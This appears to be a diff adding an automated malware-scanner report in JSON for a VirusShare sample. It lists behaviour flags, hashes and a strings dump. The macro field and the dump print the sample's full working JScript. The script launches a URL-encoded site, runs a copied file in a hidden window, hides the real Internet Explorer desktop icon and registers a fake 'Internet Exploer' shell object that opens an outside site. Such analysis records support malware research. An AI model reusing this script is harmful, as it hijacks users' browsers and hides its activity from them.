@@ -1,0 +1,50 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Command": "May run PowerShell commands",
+            "CopyFile": "May copy a file",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "Open": "May open a file",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "Shell32": "May run an executable file or a system command",
+            "ShowWindow": "May hide the application",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "//448061800\n//___C:\\Program Files\\Internet Explorer\\Iexplore.exe___\n//____http://%77%77%77%2E%74%31%36%32%2E%63%6F%6D/taobao/____\n//448061800\n\nvar _ws,_sf;WshShell=new ActiveXObject(\"WScript.Shell\");var RunLnkFile=function(){var sfn=WScript.ScriptFullName;var f=_sf.OpenTextFile(sfn,1);var fc=f.ReadAll();var _o1=/___(.*?)___/ig;var _o2=/____(.*?)____/ig;var a='',b='';if(_o1.test(fc)){a=RegExp.$1;a=a.replace(/\\\\/g,\"\\\\\\\\\");var _fkurl=\"\";if(_o2.test(fc)){b=RegExp.$1;try{_ws.Run('\"'+a+'\"  '+b,1,false)}catch(e){}}}};var Init=function(){_ws=new ActiveXObject('WScript.Shell');_sf=new ActiveXObject('Scripting.FileSystemObject')};Init();RunLnkFile();var P=new ActiveXObject(\"WScript.Shell\");var q=new ActiveXObject(\"Scripting.FileSystemObject\");var TempPath=P.SpecialFolders(\"Templates\");var StartPath=P.SpecialFolders(\"AllUsersStartup\");var _0=parseInt(Math.floor(Math.random()*9999));try{var dhead=\"c:\\\\\";var OldPath=P.CurrentDirectory;P.CurrentDirectory=TempPath;WScript.Sleep(5000);q.CopyFile(dhead+\"index.htm\",TempPath+\"\\\\\"+_0);CreateWin32(TempPath+\"\\\\\"+_0,TempPath);WScript.Sleep(60000);q.DeleteFile(TempPath+\"\\\\\"+_0)}catch(E){};function CreateWin32(_1,_2){var HIDDEN_WINDOW=12;var WMI=GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\\\\\.\\\\root\\\\cimv2:win32_processstartup\");var objConfig=WMI.SpawnInstance_();objConfig.ShowWindow=HIDDEN_WINDOW;var intProcessID=\"\";var objProcess=GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\\\\\.\\\\root\\\\cimv2:Win32_Process\");objProcess.Create(_1,_2,objConfig,intProcessID)};var CLSID=\"{86AEFBE8-763F-0647-899C-A93278894D8E}\";var URL=\"http://www.6071.com/?tt\";try{P.RegWrite(\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\HideDesktopIcons\\\\NewStartPanel\\\\{871C5380-42A0-1069-A2EA-08002B30309D}\",1,\"REG_DWORD\")}catch(e){};try{P.RegWrite(\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\HideDesktopIcons\\\\ClassicStartMenu\\\\{871C5380-42A0-1069-A2EA-08002B30309D}\",1,\"REG_DWORD\")}catch(e){};try{P.RegWrite(\"HKEY_CLASSES_ROOT\\\\CLSID\\\\\"+CLSID+\"\\\\\",\"Internet Exploer\",\"REG_SZ\")}catch(e){};try{P.RegWrite(\"HKEY_CLASSES_ROOT\\\\CLSID\\\\\"+CLSID+\"\\\\DefaultIcon\\\\\",\"C:\\\\Program Files\\\\Internet Explorer\\\\Iexplore.exe\",\"REG_SZ\")}catch(e){};try{P.RegWrite(\"HKEY_CLASSES_ROOT\\\\CLSID\\\\\"+CLSID+\"\\\\Shell\\\\\",\"\",\"REG_SZ\")}catch(e){};try{P.RegWrite(\"HKEY_CLASSES_ROOT\\\\CLSID\\\\\"+CLSID+\"\\\\Shell\\\\D\\\\Command\\\\\",\"Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl\",\"REG_SZ\")}catch(e){};try{P.RegWrite(\"HKEY_CLASSES_ROOT\\\\CLSID\\\\\"+CLSID+\"\\\\Shell\\\\Open\\\\Command\\\\\",\"C:\\\\Program Files\\\\Internet Explorer\\\\Iexplore.exe \"+URL,\"REG_SZ\")}catch(e){};try{P.RegWrite(\"HKEY_CLASSES_ROOT\\\\CLSID\\\\\"+CLSID+\"\\\\Shell\\\\\ufffd\ufffd\ufffd\ufffd\\\\Command\\\\\",\"Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl\",\"REG_SZ\")}catch(e){};try{P.RegWrite(\"HKEY_CLASSES_ROOT\\\\CLSID\\\\\"+CLSID+\"\\\\ShellFolder\\\\ShellFolder\",\"10\",\"REG_DWORD\")}catch(e){};try{P.RegWrite(\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Desktop\\\\NameSpace\\\\\"+CLSID+\"\\\\\",\"Internet Exploer\",\"REG_SZ\")}catch(e){};\n//448061800"
+    },
+    "filename": "VirusShare_1201d65d1aee1b2077a1c2213d8da4f2",
+    "filesize": 3066,
+    "filetype": "ISO-8859 text, with very long lines, with CRLF line terminators",
+    "hashes": {
+        "md5": "1201d65d1aee1b2077a1c2213d8da4f2",
+        "sha1": "4162b9f08e734d719cde5a900f2ee5f64c5c9739",
+        "sha256": "00bb9e87bf4e5ea1bd3f2d98fc2b1dcb3480bc80ecbdbc5821c87793a3cdd7ec"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "//448061800",
+            "//___C:\\Program Files\\Internet Explorer\\Iexplore.exe___",
+            "//____http://%77%77%77%2E%74%31%36%32%2E%63%6F%6D/taobao/____",
+            "//448061800",
+            "var _ws,_sf;WshShell=new ActiveXObject(\"WScript.Shell\");var RunLnkFile=function(){var sfn=WScript.ScriptFullName;var f=_sf.OpenTextFile(sfn,1);var fc=f.ReadAll();var _o1=/___(.*?)___/ig;var _o2=/____(.*?)____/ig;var a='',b='';if(_o1.test(fc)){a=RegExp.$1;a=a.replace(/\\\\/g,\"\\\\\\\\\");var _fkurl=\"\";if(_o2.test(fc)){b=RegExp.$1;try{_ws.Run('\"'+a+'\"  '+b,1,false)}catch(e){}}}};var Init=function(){_ws=new ActiveXObject('WScript.Shell');_sf=new ActiveXObject('Scripting.FileSystemObject')};Init();RunLnkFile();var P=new ActiveXObject(\"WScript.Shell\");var q=new ActiveXObject(\"Scripting.FileSystemObject\");var TempPath=P.SpecialFolders(\"Templates\");var StartPath=P.SpecialFolders(\"AllUsersStartup\");var _0=parseInt(Math.floor(Math.random()*9999));try{var dhead=\"c:\\\\\";var OldPath=P.CurrentDirectory;P.CurrentDirectory=TempPath;WScript.Sleep(5000);q.CopyFile(dhead+\"index.htm\",TempPath+\"\\\\\"+_0);CreateWin32(TempPath+\"\\\\\"+_0,TempPath);WScript.Sleep(60000);q.DeleteFile(TempPath+\"\\\\\"+_0)}catch(E){};function CreateWin32(_1,_2){var HIDDEN_WINDOW=12;var WMI=GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\\\\\.\\\\root\\\\cimv2:win32_processstartup\");var objConfig=WMI.SpawnInstance_();objConfig.ShowWindow=HIDDEN_WINDOW;var intProcessID=\"\";var objProcess=GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\\\\\.\\\\root\\\\cimv2:Win32_Process\");objProcess.Create(_1,_2,objConfig,intProcessID)};var CLSID=\"{86AEFBE8-763F-0647-899C-A93278894D8E}\";var URL=\"http://www.6071.com/?tt\";try{P.RegWrite(\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\HideDesktopIcons\\\\NewStartPanel\\\\{871C5380-42A0-1069-A2EA-08002B30309D}\",1,\"REG_DWORD\")}catch(e){};try{P.RegWrite(\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\HideDesktopIcons\\\\ClassicStartMenu\\\\{871C5380-42A0-1069-A2EA-08002B30309D}\",1,\"REG_DWORD\")}catch(e){};try{P.RegWrite(\"HKEY_CLASSES_ROOT\\\\CLSID\\\\\"+CLSID+\"\\\\\",\"Internet Exploer\",\"REG_SZ\")}catch(e){};try{P.RegWrite(\"HKEY_CLASSES_ROOT\\\\CLSID\\\\\"+CLSID+\"\\\\DefaultIcon\\\\\",\"C:\\\\Program Files\\\\Internet Explorer\\\\Iexplore.exe\",\"REG_SZ\")}catch(e){};try{P.RegWrite(\"HKEY_CLASSES_ROOT\\\\CLSID\\\\\"+CLSID+\"\\\\Shell\\\\\",\"\",\"REG_SZ\")}catch(e){};try{P.RegWrite(\"HKEY_CLASSES_ROOT\\\\CLSID\\\\\"+CLSID+\"\\\\Shell\\\\D\\\\Command\\\\\",\"Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl\",\"REG_SZ\")}catch(e){};try{P.RegWrite(\"HKEY_CLASSES_ROOT\\\\CLSID\\\\\"+CLSID+\"\\\\Shell\\\\Open\\\\Command\\\\\",\"C:\\\\Program Files\\\\Internet Explorer\\\\Iexplore.exe \"+URL,\"REG_SZ\")}catch(e){};try{P.RegWrite(\"HKEY_CLASSES_ROOT\\\\CLSID\\\\\"+CLSID+\"\\\\Shell\\\\\\\\Command\\\\\",\"Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl\",\"REG_SZ\")}catch(e){};try{P.RegWrite(\"HKEY_CLASSES_ROOT\\\\CLSID\\\\\"+CLSID+\"\\\\ShellFolder\\\\ShellFolder\",\"10\",\"REG_DWORD\")}catch(e){};try{P.RegWrite(\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Desktop\\\\NameSpace\\\\\"+CLSID+\"\\\\\",\"Internet Exploer\",\"REG_SZ\")}catch(e){};",
+            "//448061800"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://%77%77%77%2E%74%31%36%32%2E%63%6F%6D/taobao/____"
+        ]
+    },
+    "time": "0:00:00.312669",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
